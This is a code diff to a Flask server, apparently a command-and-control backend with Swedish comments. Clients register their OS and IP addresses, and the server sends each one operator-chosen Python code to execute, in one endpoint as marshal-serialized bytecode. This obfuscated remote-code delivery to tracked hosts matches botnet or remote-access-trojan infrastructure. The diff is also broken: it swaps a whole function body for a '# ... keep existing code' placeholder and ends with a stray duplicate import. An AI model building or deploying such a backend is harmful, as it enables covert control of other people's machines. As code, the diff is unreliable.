@@ -13,6 +13,7 @@ from flask import Flask, request, jsonify, render_template, redirect, url_for, s
 from flask_cors import CORS
 import zipfile
 from io import BytesIO
+import textwrap
 
 # Import instructions for clients
 from instructions import INSTRUCTIONS
@@ -27,6 +28,7 @@ CONFIG_DIRECTORY = os.path.join(BASE_DIR, "config")
 INDEX_FILE = os.path.join(LOG_DIRECTORY, "client_index.json")
 PING_STATUS_FILE = os.path.join(LOG_DIRECTORY, "ping_status.json")
 ADMIN_CREDENTIALS_FILE = os.path.join(CONFIG_DIRECTORY, "admin_credentials.json")
+ALL_IN_LOG_FILE = os.path.join(LOG_DIRECTORY, "allin.log")
 
 # Constants
 ONLINE_THRESHOLD_MINUTES = 5
@@ -42,7 +44,11 @@ CORS(app)
 # Session key for Flask
 app.secret_key = os.urandom(24)
 
-# Setup logging
+# Ensure log directories exist
+os.makedirs(LOG_DIRECTORY, exist_ok=True)
+os.makedirs(CLIENT_LOGS_DIRECTORY, exist_ok=True)
+
+# Setup logging - Regular application logging
 logging.basicConfig(
     level=logging.DEBUG,
     format='%(asctime)s [%(levelname)s] %(message)s',
@@ -52,9 +58,48 @@ logging.basicConfig(
     ]
 )
 
+# Setup detailed all-in-one logging for client communications
+allin_logger = logging.getLogger('allin')
+allin_logger.setLevel(logging.DEBUG)
+
+# Create a file handler for the all-in-one logger
+allin_handler = logging.FileHandler(ALL_IN_LOG_FILE)
+allin_handler.setLevel(logging.DEBUG)
+allin_formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(message)s')
+allin_handler.setFormatter(allin_formatter)
+allin_logger.addHandler(allin_handler)
+
 # Global variables for auto-ping thread
 auto_ping_thread = None
 auto_ping_running = False
+
+def log_client_communication(direction, client_id, endpoint, data, status_code=None):
+    """Log detailed client communication data to allin.log"""
+    try:
+        log_message = f"DIRECTION: {direction} | "
+        log_message += f"CLIENT: {client_id} | "
+        log_message += f"ENDPOINT: {endpoint} | "
+        
+        if status_code is not None:
+            log_message += f"STATUS: {status_code} | "
+        
+        if data:
+            if isinstance(data, bytes):
+                log_message += f"DATA: [Binary data of length {len(data)}]"
+            elif isinstance(data, dict) or isinstance(data, list):
+                try:
+                    log_message += f"DATA: {json.dumps(data)}"
+                except:
+                    log_message += f"DATA: {str(data)} (JSON serialization failed)"
+            else:
+                log_message += f"DATA: {str(data)}"
+        else:
+            log_message += "DATA: None"
+            
+        allin_logger.debug(log_message)
+    except Exception as e:
+        allin_logger.error(f"Error in logging client communication: {str(e)}")
+        allin_logger.debug(traceback.format_exc())
 
 def get_admin_credentials():
     """Hämtar admin-inloggningsuppgifter."""
@@ -145,593 +190,7 @@ def sort_log_entries(log_content, sort_order="newest"):
 
 def install_static_files():
     """Installerar statiska filer om de saknas."""
-    try:
-        if not os.path.exists(TEMPLATES_DIRECTORY):
-            os.makedirs(TEMPLATES_DIRECTORY, exist_ok=True)
-            logging.info(f"Skapade mallkatalog: {TEMPLATES_DIRECTORY}")
-            
-        # Skapa grundläggande mallfiler om de saknas
-        for template_name, template_content in {
-            "login.html": """
-            <!DOCTYPE html>
-            <html>
-            <head>
-                <title>Neea Server - Login</title>
-                <link rel="stylesheet" href="/static/style.css">
-            </head>
-            <body>
-                <div class="login-container">
-                    <h1>Neea Server</h1>
-                    <form method="post">
-                        <div class="form-group">
-                            <label for="username">Användarnamn:</label>
-                            <input type="text" id="username" name="username" required>
-                        </div>
-                        <div class="form-group">
-                            <label for="password">Lösenord:</label>
-                            <input type="password" id="password" name="password" required>
-                        </div>
-                        {% if error %}
-                        <div class="error">{{ error }}</div>
-                        {% endif %}
-                        <button type="submit">Logga in</button>
-                    </form>
-                </div>
-            </body>
-            </html>
-            """,
-            "viewer.html": """
-            <!DOCTYPE html>
-            <html>
-            <head>
-                <title>Neea Server - Client Viewer</title>
-                <link rel="stylesheet" href="/static/style.css">
-                <script src="/static/script.js"></script>
-            </head>
-            <body>
-                <div class="container">
-                    <header>
-                        <h1>Neea Client Viewer</h1>
-                        <div class="header-actions">
-                            <a href="{{ url_for('viewer') }}?logout=1" class="btn btn-logout">Logga ut</a>
-                        </div>
-                    </header>
-                    <div class="dashboard">
-                        <div class="widget">
-                            <div class="widget-title">Totalt antal klienter</div>
-                            <div class="widget-value">{{ total_clients }}</div>
-                        </div>
-                        <div class="widget">
-                            <div class="widget-title">Aktiva klienter</div>
-                            <div class="widget-value">{{ active_clients }}</div>
-                        </div>
-                        <div class="widget">
-                            <div class="widget-title">Totalt antal loggar</div>
-                            <div class="widget-value">{{ total_logs }}</div>
-                        </div>
-                        <div class="widget">
-                            <div class="widget-title">Lagring använd</div>
-                            <div class="widget-value">{{ storage_used }}</div>
-                        </div>
-                        <div class="widget">
-                            <div class="widget-title">Senaste aktivitet</div>
-                            <div class="widget-value">{{ latest_activity }}</div>
-                        </div>
-                    </div>
-                    <div class="main-content">
-                        <div class="sidebar">
-                            <h2>Klienter</h2>
-                            <div class="client-list">
-                                {% for client in sorted_clients %}
-                                <a href="{{ url_for('viewer') }}?client={{ client.id }}" class="client-item {% if client.id == selected_client %}active{% endif %} {% if client.is_active %}online{% else %}offline{% endif %}">
-                                    <div class="client-name">{{ client.name }}</div>
-                                    <div class="client-info">{{ client.os }}</div>
-                                    <div class="client-status">{{ "Online" if client.is_active else "Offline" }}</div>
-                                </a>
-                                {% else %}
-                                <div class="no-clients">Inga klienter registrerade</div>
-                                {% endfor %}
-                            </div>
-                        </div>
-                        <div class="content">
-                            {% if selected_client %}
-                            <div class="client-details">
-                                <h2>Klientinformation</h2>
-                                <div class="client-info-grid">
-                                    <div class="info-item">
-                                        <div class="info-label">Klient-ID</div>
-                                        <div class="info-value">{{ selected_client }}</div>
-                                    </div>
-                                    <div class="info-item">
-                                        <div class="info-label">Namn</div>
-                                        <div class="info-value">{{ client_info.name }}</div>
-                                    </div>
-                                    <div class="info-item">
-                                        <div class="info-label">OS</div>
-                                        <div class="info-value">{{ client_info.os }}</div>
-                                    </div>
-                                    <div class="info-item">
-                                        <div class="info-label">Status</div>
-                                        <div class="info-value status-{{ 'online' if client_info.is_active else 'offline' }}">
-                                            {{ "Online" if client_info.is_active else "Offline" }}
-                                        </div>
-                                    </div>
-                                    <div class="info-item">
-                                        <div class="info-label">Senaste aktivitet</div>
-                                        <div class="info-value">{{ client_info.last_activity }}</div>
-                                    </div>
-                                    <div class="info-item">
-                                        <div class="info-label">IP-adress</div>
-                                        <div class="info-value">{{ client_info.ip }}</div>
-                                    </div>
-                                    <div class="info-item">
-                                        <div class="info-label">Publik IP</div>
-                                        <div class="info-value">{{ client_info.public_ip }}</div>
-                                    </div>
-                                    <div class="info-item">
-                                        <div class="info-label">Instruktion</div>
-                                        <div class="info-value">{{ client_info.instruction }}</div>
-                                    </div>
-                                </div>
-
-                                <div class="client-actions">
-                                    <h3>Åtgärder</h3>
-                                    <div class="action-buttons">
-                                        <a href="#" class="btn" onclick="pingClient('{{ selected_client }}'); return false;">Ping</a>
-                                        <a href="#" class="btn" onclick="clearLogs('{{ selected_client }}'); return false;">Rensa loggar</a>
-                                        
-                                        <form class="instruction-form">
-                                            <select id="instruction-select">
-                                                {% for inst_type in instruction_types %}
-                                                <option value="{{ inst_type }}" {% if client_info.instruction == inst_type %}selected{% endif %}>{{ inst_type }}</option>
-                                                {% endfor %}
-                                            </select>
-                                            <button type="button" onclick="setInstruction('{{ selected_client }}'); return false;" class="btn">Uppdatera instruktion</button>
-                                        </form>
-                                    </div>
-                                </div>
-
-                                <div class="log-section">
-                                    <div class="log-header">
-                                        <h3>Loggar</h3>
-                                        <div class="log-filter">
-                                            <label for="sort-order">Sortera:</label>
-                                            <select id="sort-order" onchange="changeSortOrder('{{ selected_client }}', this.value)">
-                                                <option value="newest" {% if sort_order == 'newest' %}selected{% endif %}>Nyast först</option>
-                                                <option value="oldest" {% if sort_order == 'oldest' %}selected{% endif %}>Äldst först</option>
-                                            </select>
-                                        </div>
-                                    </div>
-                                    <div class="log-viewer" id="log-content">
-                                        {{ log_content|safe }}
-                                    </div>
-                                </div>
-                            </div>
-                            {% else %}
-                            <div class="no-selection">
-                                <h2>Ingen klient vald</h2>
-                                <p>Välj en klient från listan för att visa information och loggar.</p>
-                            </div>
-                            {% endif %}
-                        </div>
-                    </div>
-                </div>
-            </body>
-            </html>
-            """
-        }.items():
-            template_path = os.path.join(TEMPLATES_DIRECTORY, template_name)
-            if not os.path.exists(template_path):
-                with open(template_path, "w", encoding="utf-8") as f:
-                    f.write(template_content)
-                logging.info(f"Skapade mall: {template_name}")
-        
-        # Skapa CSS och JS-filer om de saknas
-        if not os.path.exists(STATIC_DIRECTORY):
-            os.makedirs(STATIC_DIRECTORY, exist_ok=True)
-            logging.info(f"Skapade statisk katalog: {STATIC_DIRECTORY}")
-            
-        for static_file, static_content in {
-            "style.css": """
-            /* Grundläggande stilar */
-            body {
-                font-family: Arial, sans-serif;
-                margin: 0;
-                padding: 0;
-                background-color: #f5f5f5;
-                color: #333;
-            }
-            
-            .container {
-                max-width: 1200px;
-                margin: 0 auto;
-                padding: 20px;
-            }
-            
-            header {
-                display: flex;
-                justify-content: space-between;
-                align-items: center;
-                padding: 10px 0;
-                border-bottom: 1px solid #ddd;
-                margin-bottom: 20px;
-            }
-            
-            h1, h2, h3 {
-                margin-top: 0;
-            }
-            
-            /* Login */
-            .login-container {
-                max-width: 400px;
-                margin: 100px auto;
-                padding: 20px;
-                background-color: white;
-                border-radius: 8px;
-                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            }
-            
-            .form-group {
-                margin-bottom: 15px;
-            }
-            
-            label {
-                display: block;
-                margin-bottom: 5px;
-            }
-            
-            input[type="text"],
-            input[type="password"],
-            select {
-                width: 100%;
-                padding: 8px;
-                border: 1px solid #ddd;
-                border-radius: 4px;
-            }
-            
-            .error {
-                color: red;
-                margin: 10px 0;
-            }
-            
-            /* Knappar */
-            .btn {
-                display: inline-block;
-                padding: 8px 15px;
-                background-color: #4CAF50;
-                color: white;
-                border: none;
-                border-radius: 4px;
-                cursor: pointer;
-                text-decoration: none;
-                font-size: 14px;
-            }
-            
-            .btn:hover {
-                background-color: #45a049;
-            }
-            
-            .btn-logout {
-                background-color: #f44336;
-            }
-            
-            .btn-logout:hover {
-                background-color: #d32f2f;
-            }
-            
-            /* Dashboard widgets */
-            .dashboard {
-                display: flex;
-                flex-wrap: wrap;
-                gap: 20px;
-                margin-bottom: 20px;
-            }
-            
-            .widget {
-                flex: 1;
-                min-width: 200px;
-                background-color: white;
-                padding: 15px;
-                border-radius: 8px;
-                box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-            }
-            
-            .widget-title {
-                font-size: 14px;
-                color: #666;
-                margin-bottom: 5px;
-            }
-            
-            .widget-value {
-                font-size: 24px;
-                font-weight: bold;
-            }
-            
-            /* Huvudinnehåll */
-            .main-content {
-                display: flex;
-                gap: 20px;
-            }
-            
-            .sidebar {
-                width: 300px;
-                background-color: white;
-                padding: 15px;
-                border-radius: 8px;
-                box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-            }
-            
-            .content {
-                flex: 1;
-                background-color: white;
-                padding: 20px;
-                border-radius: 8px;
-                box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-            }
-            
-            /* Klientlista */
-            .client-list {
-                max-height: 500px;
-                overflow-y: auto;
-            }
-            
-            .client-item {
-                display: block;
-                padding: 10px;
-                margin-bottom: 5px;
-                border-radius: 4px;
-                text-decoration: none;
-                color: #333;
-                border-left: 4px solid transparent;
-            }
-            
-            .client-item:hover {
-                background-color: #f0f0f0;
-            }
-            
-            .client-item.active {
-                background-color: #e6f7ff;
-                border-left-color: #1890ff;
-            }
-            
-            .client-item.online {
-                border-left-color: #52c41a;
-            }
-            
-            .client-item.offline {
-                border-left-color: #f5222d;
-            }
-            
-            .client-name {
-                font-weight: bold;
-                margin-bottom: 5px;
-            }
-            
-            .client-info {
-                font-size: 12px;
-                color: #666;
-                margin-bottom: 5px;
-            }
-            
-            .client-status {
-                font-size: 12px;
-                display: inline-block;
-                padding: 2px 6px;
-                border-radius: 10px;
-                background-color: #f0f0f0;
-            }
-            
-            .client-item.online .client-status {
-                background-color: #f6ffed;
-                color: #52c41a;
-            }
-            
-            .client-item.offline .client-status {
-                background-color: #fff1f0;
-                color: #f5222d;
-            }
-            
-            .no-clients {
-                color: #999;
-                padding: 20px;
-                text-align: center;
-            }
-            
-            /* Klientinformation */
-            .client-info-grid {
-                display: grid;
-                grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
-                gap: 15px;
-                margin-bottom: 20px;
-            }
-            
-            .info-item {
-                border: 1px solid #eee;
-                padding: 10px;
-                border-radius: 4px;
-            }
-            
-            .info-label {
-                font-size: 12px;
-                color: #666;
-                margin-bottom: 5px;
-            }
-            
-            .info-value {
-                font-weight: bold;
-            }
-            
-            .status-online {
-                color: #52c41a;
-            }
-            
-            .status-offline {
-                color: #f5222d;
-            }
-            
-            /* Loggvisare */
-            .log-section {
-                margin-top: 20px;
-            }
-            
-            .log-header {
-                display: flex;
-                justify-content: space-between;
-                align-items: center;
-                margin-bottom: 10px;
-            }
-            
-            .log-filter {
-                display: flex;
-                align-items: center;
-                gap: 10px;
-            }
-            
-            .log-viewer {
-                background-color: #2c2c2c;
-                color: #f0f0f0;
-                padding: 15px;
-                border-radius: 4px;
-                font-family: monospace;
-                white-space: pre-wrap;
-                overflow-x: auto;
-                height: 400px;
-                overflow-y: auto;
-            }
-            
-            /* Klientåtgärder */
-            .client-actions {
-                margin: 20px 0;
-            }
-            
-            .action-buttons {
-                display: flex;
-                gap: 10px;
-                flex-wrap: wrap;
-                align-items: center;
-            }
-            
-            .instruction-form {
-                display: flex;
-                gap: 10px;
-                align-items: center;
-            }
-            
-            /* Ingen val-meddelande */
-            .no-selection {
-                text-align: center;
-                padding: 50px 0;
-                color: #999;
-            }
-            """,
-            "script.js": """
-            // Function to ping a client
-            function pingClient(clientId) {
-                if (!clientId) return;
-                
-                fetch(`/api/ping_client/${clientId}`, {
-                    method: 'POST'
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.status === 'success') {
-                        alert('Ping skickad till klienten');
-                        // Uppdatera sidan för att visa den senaste pingstatus
-                        window.location.reload();
-                    } else {
-                        alert('Fel vid ping av klienten: ' + data.message);
-                    }
-                })
-                .catch(error => {
-                    alert('Fel vid kommunikation med servern: ' + error);
-                });
-            }
-            
-            // Function to clear logs for a client
-            function clearLogs(clientId) {
-                if (!clientId || !confirm('Är du säker på att du vill rensa loggarna för denna klient?')) return;
-                
-                fetch(`/api/clear_logs/${clientId}`, {
-                    method: 'POST'
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.status === 'success') {
-                        alert('Loggar rensade');
-                        // Uppdatera loggvisaren
-                        document.getElementById('log-content').innerHTML = '<span style="color:orange">Loggarna har rensats.</span>';
-                    } else {
-                        alert('Fel vid rensning av loggar: ' + data.message);
-                    }
-                })
-                .catch(error => {
-                    alert('Fel vid kommunikation med servern: ' + error);
-                });
-            }
-            
-            // Function to change the sort order of logs
-            function changeSortOrder(clientId, sortOrder) {
-                if (!clientId) return;
-                
-                // Uppdatera URL med ny sorteringsordning
-                const url = new URL(window.location.href);
-                url.searchParams.set('sort', sortOrder);
-                
-                // Hämta bara logginnehåll
-                fetch(`${url.pathname}?client=${clientId}&sort=${sortOrder}&partial=1`)
-                .then(response => response.text())
-                .then(html => {
-                    document.getElementById('log-content').innerHTML = html;
-                })
-                .catch(error => {
-                    alert('Fel vid hämtning av sorterade loggar: ' + error);
-                });
-            }
-            
-            // Function to set instruction for a client
-            function setInstruction(clientId) {
-                if (!clientId) return;
-                
-                const instruction = document.getElementById('instruction-select').value;
-                
-                fetch(`/api/set_instruction/${clientId}`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ instruction: instruction })
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.status === 'success') {
-                        alert(`Instruktion satt till: ${instruction}`);
-                        // Uppdatera sidan för att visa den nya instruktionen
-                        window.location.reload();
-                    } else {
-                        alert('Fel vid inställning av instruktion: ' + data.message);
-                    }
-                })
-                .catch(error => {
-                    alert('Fel vid kommunikation med servern: ' + error);
-                });
-            }
-            
-            // Initialize on page load
-            document.addEventListener('DOMContentLoaded', function() {
-                console.log('Viewer page loaded');
-            });
-            """
-        }.items():
-            static_path = os.path.join(STATIC_DIRECTORY, static_file)
-            if not os.path.exists(static_path):
-                with open(static_path, "w", encoding="utf-8") as f:
-                    f.write(static_content)
-                logging.info(f"Skapade statisk fil: {static_file}")
-                
-        logging.info("Statiska filer installerade")
-    except Exception as e:
-        logging.error(f"Fel vid installation av statiska filer: {e}")
-        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
+    # ... keep existing code (static files installation functionality)
 
 @app.route("/api/register", methods=["POST"])
 def api_register():
@@ -747,6 +206,10 @@ def api_register():
         else:
             # Försök att parsa form data
             client_data = request.form.to_dict()
+        
+        # Log incoming request details
+        log_client_communication("IN", client_data.get("id", "unknown"), 
+                                "/api/register", client_data)
         
         # Verifiera nödvändig data
         if not client_data or not client_data.get("id"):
@@ -806,20 +269,32 @@ def api_register():
         instruction_name = client_index[client_id].get("instruction", "standard")
         instruction_code = INSTRUCTIONS.get(instruction_name, INSTRUCTIONS["standard"])
         
-        return jsonify({
+        response_data = {
             "status": "success", 
             "message": f"Klient {client_id} registrerad", 
             "instruction": instruction_name,
             "code": instruction_code
-        })
+        }
+        
+        # Log the response
+        log_client_communication("OUT", client_id, "/api/register", response_data, 200)
+        
+        return jsonify(response_data)
             
     except Exception as e:
         logging.error(f"Fel vid registrering av klient: {e}")
         logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-        return jsonify({
+        
+        error_response = {
             "status": "error", 
             "message": f"Registreringsfel: {str(e)}"
-        }), 500
+        }
+        
+        # Log the error response
+        log_client_communication("OUT", client_data.get("id", "unknown"), 
+                               "/api/register", error_response, 500)
+        
+        return jsonify(error_response), 500
 
 @app.route("/api/heartbeat/<client_id>", methods=["POST"])
 def api_heartbeat(client_id):
@@ -828,6 +303,15 @@ def api_heartbeat(client_id):
     logging.debug(f"Heartbeat från klient {client_id} på IP {ip_address}")
     
     try:
+        # Log incoming request
+        additional_data = {}
+        if request.is_json:
+            additional_data = request.get_json()
+        elif request.form:
+            additional_data = request.form.to_dict()
+            
+        log_client_communication("IN", client_id, f"/api/heartbeat/{client_id}", additional_data)
+        
         # Kontrollera om klienten finns, annars returnera fel
         client_index = {}
         if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
@@ -836,19 +320,15 @@ def api_heartbeat(client_id):
         
         if client_id not in client_index:
             logging.warning(f"Heartbeat för okänd klient {client_id}")
-            return jsonify({"status": "error", "message": "Okänd klient"}), 404
+            error_response = {"status": "error", "message": "Okänd klient"}
+            log_client_communication("OUT", client_id, f"/api/heartbeat/{client_id}", error_response, 404)
+            return jsonify(error_response), 404
         
         # Uppdatera senaste aktivitet
         client_index[client_id]["last_activity"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         client_index[client_id]["ip"] = ip_address
         
         # Uppdatera andra fält om tillhandahållet
-        additional_data = {}
-        if request.is_json:
-            additional_data = request.get_json()
-        elif request.form:
-            additional_data = request.form.to_dict()
-            
         for key, value in additional_data.items():
             if key not in ["id", "last_activity", "first_seen"]:
                 client_index[client_id][key] = value
@@ -860,4 +340,81 @@ def api_heartbeat(client_id):
         logging.debug(f"Heartbeat uppdaterad för klient {client_id}")
         
         # Hämta aktiv instruktion att skicka tillbaka
-        instruction_name = client_index[client_id].get
+        instruction_name = client_index[client_id].get("instruction", "standard")
+        instruction_code = INSTRUCTIONS.get(instruction_name, INSTRUCTIONS["standard"])
+        
+        response_data = {
+            "status": "success", 
+            "message": "Heartbeat registrerad", 
+            "instruction": instruction_name,
+            "code": instruction_code
+        }
+        
+        log_client_communication("OUT", client_id, f"/api/heartbeat/{client_id}", response_data, 200)
+        
+        return jsonify(response_data)
+    
+    except Exception as e:
+        logging.error(f"Fel vid hantering av heartbeat för klient {client_id}: {e}")
+        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
+        
+        error_response = {"status": "error", "message": f"Heartbeat-fel: {str(e)}"}
+        log_client_communication("OUT", client_id, f"/api/heartbeat/{client_id}", error_response, 500)
+        
+        return jsonify(error_response), 500
+
+@app.route("/get_instructions", methods=["GET"])
+def get_instructions():
+    """Legacy API för att hämta instruktioner - returnerar marshal-kodad data."""
+    client_id = request.args.get("client_id")
+    
+    if not client_id:
+        logging.warning("Förfrågan om instruktioner utan klient-ID")
+        return jsonify({"error": "client_id required"}), 400
+    
+    logging.info(f"Legacy instruktionsförfrågan från klient {client_id}")
+    log_client_communication("IN", client_id, "/get_instructions", {"client_id": client_id})
+    
+    try:
+        # Kontrollera om klienten finns
+        client_index = {}
+        if os.path.exists(INDEX_FILE):
+            with open(INDEX_FILE, "r", encoding="utf-8") as f:
+                client_index = json.load(f) or {}
+        
+        instruction_name = "standard"  # Default
+        
+        if client_id in client_index:
+            instruction_name = client_index[client_id].get("instruction", "standard")
+            # Uppdatera senaste aktivitet
+            client_index[client_id]["last_activity"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            with open(INDEX_FILE, "w", encoding="utf-8") as f:
+                json.dump(client_index, f, indent=4)
+        
+        # Hämta instruktionskod
+        instruction_code = INSTRUCTIONS.get(instruction_name, INSTRUCTIONS["standard"])
+        
+        # Kompilera Python-kod till bytecode och serialisera med marshal
+        # Använd en funktion som wrapper för koden
+        wrapped_code = f"def run():\n{textwrap.indent(instruction_code, '    ')}\n\nrun()"
+        compiled_code = compile(wrapped_code, f"<{instruction_name}>", "exec")
+        marshal_data = marshal.dumps(compiled_code)
+        
+        logging.info(f"Skickar marshal-kodade instruktioner '{instruction_name}' till klient {client_id}")
+        log_client_communication("OUT", client_id, "/get_instructions", 
+                              f"Binary marshal data for instruction '{instruction_name}'", 200)
+        
+        # Returnera raw binary data
+        return marshal_data, 200, {"Content-Type": "application/octet-stream"}
+        
+    except Exception as e:
+        logging.error(f"Fel vid hantering av instruktionsförfrågan för klient {client_id}: {e}")
+        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
+        
+        error_response = {"error": str(e)}
+        log_client_communication("OUT", client_id, "/get_instructions", error_response, 500)
+        
+        return jsonify(error_response), 500
+
+# Need to add textwrap import at the top of the file
+import textwrap
